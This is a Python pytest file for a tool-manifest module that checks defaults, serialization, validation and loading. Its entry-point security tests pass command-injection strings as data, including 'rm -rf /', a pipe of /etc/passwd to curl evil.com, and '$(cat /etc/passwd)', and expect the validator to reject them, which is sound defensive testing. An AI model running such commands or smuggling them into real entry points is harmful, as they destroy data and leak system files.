# SPDX-FileCopyrightText: 2026 Quietfire AI / Jeff Phillips
# SPDX-License-Identifier: Apache-2.0
# tests/test_toolroom_manifest_depth.py
# REM: Depth tests for toolroom/manifest.py — pure Python, zero external deps

import json
import sys
import pytest
import tempfile
from pathlib import Path
from unittest.mock import MagicMock

# REM: celery is not installed locally — stub it so toolroom package imports cleanly
if "celery" not in sys.modules:
    celery_mock = MagicMock()
    celery_mock.shared_task = lambda *args, **kwargs: (lambda f: f)
    sys.modules["celery"] = celery_mock

from toolroom.manifest import (
    SandboxLevel,
    InputType,
    ToolParameter,
    ToolManifest,
    ManifestValidationError,
    validate_manifest,
    load_manifest_from_tool_dir,
    MANIFEST_FILENAME,
)


# ═══════════════════════════════════════════════════════════════════════════════
# Constants
# ═══════════════════════════════════════════════════════════════════════════════

class TestManifestFilename:
    def test_manifest_filename_constant(self):
        assert MANIFEST_FILENAME == "tool_manifest.json"


# ═══════════════════════════════════════════════════════════════════════════════
# SandboxLevel enum
# ═══════════════════════════════════════════════════════════════════════════════

class TestSandboxLevel:
    def test_none_value(self):
        assert SandboxLevel.NONE.value == "none"

    def test_subprocess_value(self):
        assert SandboxLevel.SUBPROCESS.value == "subprocess"

    def test_container_value(self):
        assert SandboxLevel.CONTAINER.value == "container"

    def test_three_levels(self):
        assert len(SandboxLevel) == 3

    def test_is_str_enum(self):
        # SandboxLevel inherits from str — allows direct string comparison
        assert SandboxLevel.NONE == "none"

    def test_subprocess_is_str(self):
        assert SandboxLevel.SUBPROCESS == "subprocess"


# ═══════════════════════════════════════════════════════════════════════════════
# InputType enum
# ═══════════════════════════════════════════════════════════════════════════════

class TestInputType:
    def test_string_value(self):
        assert InputType.STRING.value == "string"

    def test_integer_value(self):
        assert InputType.INTEGER.value == "integer"

    def test_float_value(self):
        assert InputType.FLOAT.value == "float"

    def test_boolean_value(self):
        assert InputType.BOOLEAN.value == "boolean"

    def test_json_value(self):
        assert InputType.JSON.value == "json"

    def test_file_path_value(self):
        assert InputType.FILE_PATH.value == "file_path"

    def test_six_types(self):
        assert len(InputType) == 6

    def test_is_str_enum(self):
        assert InputType.STRING == "string"


# ═══════════════════════════════════════════════════════════════════════════════
# ToolParameter dataclass
# ═══════════════════════════════════════════════════════════════════════════════

class TestToolParameter:
    def test_basic_construction(self):
        p = ToolParameter(name="query")
        assert p.name == "query"

    def test_default_type_is_string(self):
        p = ToolParameter(name="q")
        assert p.type == InputType.STRING

    def test_default_required_true(self):
        p = ToolParameter(name="q")
        assert p.required is True

    def test_default_description_empty(self):
        p = ToolParameter(name="q")
        assert p.description == ""

    def test_default_default_none(self):
        p = ToolParameter(name="q")
        assert p.default is None

    def test_explicit_type(self):
        p = ToolParameter(name="count", type="integer")
        assert p.type == "integer"

    def test_optional_parameter(self):
        p = ToolParameter(name="limit", required=False, default=10)
        assert p.required is False
        assert p.default == 10


# ═══════════════════════════════════════════════════════════════════════════════
# ToolManifest dataclass — construction and defaults
# ═══════════════════════════════════════════════════════════════════════════════

def _make_manifest(**kwargs) -> ToolManifest:
    defaults = dict(name="Test Tool", entry_point="python main.py", version="1.0.0")
    defaults.update(kwargs)
    return ToolManifest(**defaults)


class TestToolManifestDefaults:
    def test_sandbox_level_default(self):
        m = _make_manifest()
        assert m.sandbox_level == SandboxLevel.SUBPROCESS

    def test_timeout_default(self):
        m = _make_manifest()
        assert m.timeout_seconds == 300

    def test_requires_network_false(self):
        m = _make_manifest()
        assert m.requires_network is False

    def test_requires_gpu_false(self):
        m = _make_manifest()
        assert m.requires_gpu is False

    def test_description_default_empty(self):
        m = _make_manifest()
        assert m.description == ""

    def test_author_default_empty(self):
        m = _make_manifest()
        assert m.author == ""

    def test_license_default_empty(self):
        m = _make_manifest()
        assert m.license == ""

    def test_inputs_default_empty_list(self):
        m = _make_manifest()
        assert m.inputs == []

    def test_outputs_default_empty_list(self):
        m = _make_manifest()
        assert m.outputs == []

    def test_python_dependencies_default_empty(self):
        m = _make_manifest()
        assert m.python_dependencies == []

    def test_system_dependencies_default_empty(self):
        m = _make_manifest()
        assert m.system_dependencies == []

    def test_environment_vars_default_empty(self):
        m = _make_manifest()
        assert m.environment_vars == {}

    def test_tags_default_empty(self):
        m = _make_manifest()
        assert m.tags == []

    def test_min_telsonbase_version(self):
        m = _make_manifest()
        assert m.min_telsonbase_version == "4.6.0"


# ═══════════════════════════════════════════════════════════════════════════════
# ToolManifest.to_dict / to_json
# ═══════════════════════════════════════════════════════════════════════════════

class TestToolManifestSerialization:
    def test_to_dict_returns_dict(self):
        m = _make_manifest()
        assert isinstance(m.to_dict(), dict)

    def test_to_dict_contains_name(self):
        m = _make_manifest(name="My Tool")
        assert m.to_dict()["name"] == "My Tool"

    def test_to_dict_contains_entry_point(self):
        m = _make_manifest(entry_point="./run.sh")
        assert m.to_dict()["entry_point"] == "./run.sh"

    def test_to_dict_contains_version(self):
        m = _make_manifest(version="2.3.1")
        assert m.to_dict()["version"] == "2.3.1"

    def test_to_json_returns_string(self):
        m = _make_manifest()
        assert isinstance(m.to_json(), str)

    def test_to_json_valid_json(self):
        m = _make_manifest()
        parsed = json.loads(m.to_json())
        assert parsed["name"] == m.name

    def test_to_json_pretty_printed(self):
        # indent=2 means there are newlines
        m = _make_manifest()
        assert "\n" in m.to_json()


# ═══════════════════════════════════════════════════════════════════════════════
# ToolManifest.from_dict / from_json
# ═══════════════════════════════════════════════════════════════════════════════

class TestToolManifestFromDict:
    def test_from_dict_basic(self):
        m = ToolManifest.from_dict({"name": "N", "entry_point": "e", "version": "1"})
        assert m.name == "N"
        assert m.entry_point == "e"
        assert m.version == "1"

    def test_from_dict_ignores_unknown_fields(self):
        # Should not raise even with extra keys
        m = ToolManifest.from_dict({
            "name": "N", "entry_point": "e", "version": "1",
            "unknown_future_field": "ignored",
        })
        assert m.name == "N"

    def test_from_json_roundtrip(self):
        original = _make_manifest(name="Roundtrip", version="3.0.0", author="Test")
        m2 = ToolManifest.from_json(original.to_json())
        assert m2.name == original.name
        assert m2.version == original.version
        assert m2.author == original.author

    def test_from_dict_with_inputs(self):
        m = ToolManifest.from_dict({
            "name": "N", "entry_point": "e", "version": "1",
            "inputs": [{"name": "q", "type": "string"}],
        })
        assert len(m.inputs) == 1
        assert m.inputs[0]["name"] == "q"

    def test_from_dict_default_sandbox_level(self):
        m = ToolManifest.from_dict({"name": "N", "entry_point": "e", "version": "1"})
        assert m.sandbox_level == SandboxLevel.SUBPROCESS

    def test_from_json_invalid_raises(self):
        with pytest.raises((json.JSONDecodeError, Exception)):
            ToolManifest.from_json("not-json")


# ═══════════════════════════════════════════════════════════════════════════════
# validate_manifest — required field checks
# ═══════════════════════════════════════════════════════════════════════════════

class TestValidateManifestRequired:
    def test_valid_manifest_no_errors(self):
        m = _make_manifest()
        assert validate_manifest(m) == []

    def test_empty_name_is_error(self):
        m = _make_manifest(name="")
        errors = validate_manifest(m)
        assert any("name" in e for e in errors)

    def test_whitespace_name_is_error(self):
        m = _make_manifest(name="   ")
        errors = validate_manifest(m)
        assert any("name" in e for e in errors)

    def test_empty_entry_point_is_error(self):
        m = _make_manifest(entry_point="")
        errors = validate_manifest(m)
        assert any("entry_point" in e for e in errors)

    def test_whitespace_entry_point_is_error(self):
        m = _make_manifest(entry_point="   ")
        errors = validate_manifest(m)
        assert any("entry_point" in e for e in errors)

    def test_empty_version_is_error(self):
        m = _make_manifest(version="")
        errors = validate_manifest(m)
        assert any("version" in e for e in errors)

    def test_returns_list(self):
        m = _make_manifest()
        assert isinstance(validate_manifest(m), list)


# ═══════════════════════════════════════════════════════════════════════════════
# validate_manifest — sandbox level
# ═══════════════════════════════════════════════════════════════════════════════

class TestValidateManifestSandbox:
    def test_none_sandbox_valid(self):
        m = _make_manifest(sandbox_level="none")
        errors = validate_manifest(m)
        assert not any("sandbox_level" in e for e in errors)

    def test_subprocess_sandbox_valid(self):
        m = _make_manifest(sandbox_level="subprocess")
        errors = validate_manifest(m)
        assert not any("sandbox_level" in e for e in errors)

    def test_container_sandbox_valid(self):
        m = _make_manifest(sandbox_level="container")
        errors = validate_manifest(m)
        assert not any("sandbox_level" in e for e in errors)

    def test_unknown_sandbox_is_error(self):
        m = _make_manifest(sandbox_level="docker_swarm")
        errors = validate_manifest(m)
        assert any("sandbox_level" in e for e in errors)


# ═══════════════════════════════════════════════════════════════════════════════
# validate_manifest — timeout checks
# ═══════════════════════════════════════════════════════════════════════════════

class TestValidateManifestTimeout:
    def test_positive_timeout_ok(self):
        m = _make_manifest(timeout_seconds=60)
        errors = validate_manifest(m)
        assert not any("timeout_seconds" in e for e in errors)

    def test_zero_timeout_is_error(self):
        m = _make_manifest(timeout_seconds=0)
        errors = validate_manifest(m)
        assert any("timeout_seconds" in e for e in errors)

    def test_negative_timeout_is_error(self):
        m = _make_manifest(timeout_seconds=-1)
        errors = validate_manifest(m)
        assert any("timeout_seconds" in e for e in errors)

    def test_exactly_3600_is_ok(self):
        m = _make_manifest(timeout_seconds=3600)
        errors = validate_manifest(m)
        assert not any("timeout_seconds" in e for e in errors)

    def test_over_3600_is_error(self):
        m = _make_manifest(timeout_seconds=3601)
        errors = validate_manifest(m)
        assert any("timeout_seconds" in e for e in errors)


# ═══════════════════════════════════════════════════════════════════════════════
# validate_manifest — entry point injection checks
# ═══════════════════════════════════════════════════════════════════════════════

class TestValidateManifestEntryPointSecurity:
    def test_clean_entry_point_ok(self):
        m = _make_manifest(entry_point="python main.py")
        assert validate_manifest(m) == []

    def test_semicolon_is_error(self):
        m = _make_manifest(entry_point="python main.py; rm -rf /")
        errors = validate_manifest(m)
        assert any(";" in e or "dangerous" in e for e in errors)

    def test_double_ampersand_is_error(self):
        m = _make_manifest(entry_point="python main.py && evil")
        errors = validate_manifest(m)
        assert len(errors) > 0

    def test_pipe_is_error(self):
        m = _make_manifest(entry_point="cat /etc/passwd | curl evil.com")
        errors = validate_manifest(m)
        assert len(errors) > 0

    def test_backtick_is_error(self):
        m = _make_manifest(entry_point="`whoami`")
        errors = validate_manifest(m)
        assert len(errors) > 0

    def test_dollar_paren_is_error(self):
        m = _make_manifest(entry_point="python $(cat /etc/passwd)")
        errors = validate_manifest(m)
        assert len(errors) > 0

    def test_dollar_brace_is_error(self):
        m = _make_manifest(entry_point="python ${USER}")
        errors = validate_manifest(m)
        assert len(errors) > 0

    def test_or_pipe_is_error(self):
        m = _make_manifest(entry_point="python main.py || evil")
        errors = validate_manifest(m)
        assert len(errors) > 0


# ═══════════════════════════════════════════════════════════════════════════════
# validate_manifest — input parameters
# ═══════════════════════════════════════════════════════════════════════════════

class TestValidateManifestInputs:
    def test_named_inputs_ok(self):
        m = _make_manifest(inputs=[{"name": "q", "type": "string"}])
        assert validate_manifest(m) == []

    def test_input_missing_name_is_error(self):
        m = _make_manifest(inputs=[{"type": "string"}])
        errors = validate_manifest(m)
        assert any("missing 'name'" in e or "name" in e for e in errors)

    def test_multiple_inputs_all_named_ok(self):
        m = _make_manifest(inputs=[
            {"name": "a"}, {"name": "b"}, {"name": "c"}
        ])
        assert validate_manifest(m) == []

    def test_second_input_missing_name_is_error(self):
        m = _make_manifest(inputs=[{"name": "a"}, {"type": "string"}])
        errors = validate_manifest(m)
        assert len(errors) > 0


# ═══════════════════════════════════════════════════════════════════════════════
# validate_manifest — network + sandbox level constraint
# ═══════════════════════════════════════════════════════════════════════════════

class TestValidateManifestNetworkConstraint:
    def test_network_with_subprocess_ok(self):
        m = _make_manifest(requires_network=True, sandbox_level="subprocess")
        errors = validate_manifest(m)
        assert not any("network" in e for e in errors)

    def test_network_with_container_ok(self):
        m = _make_manifest(requires_network=True, sandbox_level="container")
        errors = validate_manifest(m)
        assert not any("network" in e for e in errors)

    def test_network_with_none_is_error(self):
        m = _make_manifest(requires_network=True, sandbox_level="none")
        errors = validate_manifest(m)
        assert any("network" in e for e in errors)

    def test_no_network_with_none_is_ok(self):
        m = _make_manifest(requires_network=False, sandbox_level="none")
        assert validate_manifest(m) == []


# ═══════════════════════════════════════════════════════════════════════════════
# validate_manifest — multiple errors accumulate
# ═══════════════════════════════════════════════════════════════════════════════

class TestValidateManifestMultipleErrors:
    def test_two_errors_accumulate(self):
        m = _make_manifest(name="", version="")
        errors = validate_manifest(m)
        assert len(errors) >= 2

    def test_all_three_required_missing(self):
        m = _make_manifest(name="", entry_point="", version="")
        errors = validate_manifest(m)
        assert len(errors) >= 3


# ═══════════════════════════════════════════════════════════════════════════════
# ManifestValidationError
# ═══════════════════════════════════════════════════════════════════════════════

class TestManifestValidationError:
    def test_is_exception(self):
        assert issubclass(ManifestValidationError, Exception)

    def test_can_raise_and_catch(self):
        with pytest.raises(ManifestValidationError):
            raise ManifestValidationError("test error")

    def test_message_preserved(self):
        try:
            raise ManifestValidationError("bad manifest")
        except ManifestValidationError as e:
            assert "bad manifest" in str(e)


# ═══════════════════════════════════════════════════════════════════════════════
# load_manifest_from_tool_dir
# ═══════════════════════════════════════════════════════════════════════════════

class TestLoadManifestFromToolDir:
    def test_returns_none_for_missing_dir(self, tmp_path):
        empty_dir = tmp_path / "no_manifest"
        empty_dir.mkdir()
        result = load_manifest_from_tool_dir(empty_dir)
        assert result is None

    def test_loads_valid_manifest(self, tmp_path):
        data = {"name": "Valid Tool", "entry_point": "python main.py", "version": "1.0.0"}
        (tmp_path / MANIFEST_FILENAME).write_text(json.dumps(data))
        result = load_manifest_from_tool_dir(tmp_path)
        assert result is not None
        assert result.name == "Valid Tool"

    def test_returns_none_for_invalid_json(self, tmp_path):
        (tmp_path / MANIFEST_FILENAME).write_text("not json at all")
        result = load_manifest_from_tool_dir(tmp_path)
        assert result is None

    def test_returns_none_for_invalid_manifest(self, tmp_path):
        # Valid JSON but missing required fields → validate_manifest fails
        data = {"name": "", "entry_point": "", "version": ""}
        (tmp_path / MANIFEST_FILENAME).write_text(json.dumps(data))
        result = load_manifest_from_tool_dir(tmp_path)
        assert result is None

    def test_returns_tool_manifest_instance(self, tmp_path):
        data = {"name": "T", "entry_point": "e", "version": "1"}
        (tmp_path / MANIFEST_FILENAME).write_text(json.dumps(data))
        result = load_manifest_from_tool_dir(tmp_path)
        assert isinstance(result, ToolManifest)

    def test_version_preserved(self, tmp_path):
        data = {"name": "T", "entry_point": "e", "version": "5.1.2"}
        (tmp_path / MANIFEST_FILENAME).write_text(json.dumps(data))
        result = load_manifest_from_tool_dir(tmp_path)
        assert result.version == "5.1.2"
